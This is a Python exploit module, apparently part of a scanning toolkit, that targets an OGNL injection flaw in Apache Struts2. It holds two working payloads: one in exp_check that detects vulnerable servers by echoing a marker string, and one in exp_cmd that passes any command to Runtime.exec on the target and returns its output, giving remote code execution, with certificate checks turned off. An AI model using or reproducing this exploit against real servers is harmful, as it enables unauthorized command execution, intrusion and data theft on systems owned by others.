# -*- coding: utf-8 -*-
#author: cwbird

import requests
import sys
sys.path.append("..")
import config
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)


def exp_check(url):
    payload = "method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23req%3d%40org.apache.struts2.ServletActionContext%40getRequest(),%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding[0]),%23w%3d%23res.getWriter(),%23w.print(%23parameters.web[0]),%23w.print(%23parameters.path[0]),%23w.close(),1?%23xx:%23request.toString&pp=%2f&encoding=UTF-8&web=7969676569776f6c696769616f&path=check"
    headers = {'Content-Type':'application/x-www-form-urlencoded'}
    try:
        r = requests.post(url, data =payload,headers=headers,timeout=5,verify= False)
        if r"7969676569776f6c696769616f" in r.text:
            return 1
        return 2
    except:
        return 3


def exp_cmd(url,cmd):
    payload = "method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding[0]),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd[0]).getInputStream()).useDelimiter(%23parameters.pp[0]),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp[0],%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&cmd="+cmd+"&pp=\\\\AAAA&ppp=%20&encoding=UTF-8"
    headers = {'Content-Type':'application/x-www-form-urlencoded'}
    
    try:
        r = requests.post(url, data = payload,headers=headers,timeout=5,verify= False)
        return r.text
    except:
        return 3
if __name__ == '__main__':
    pass
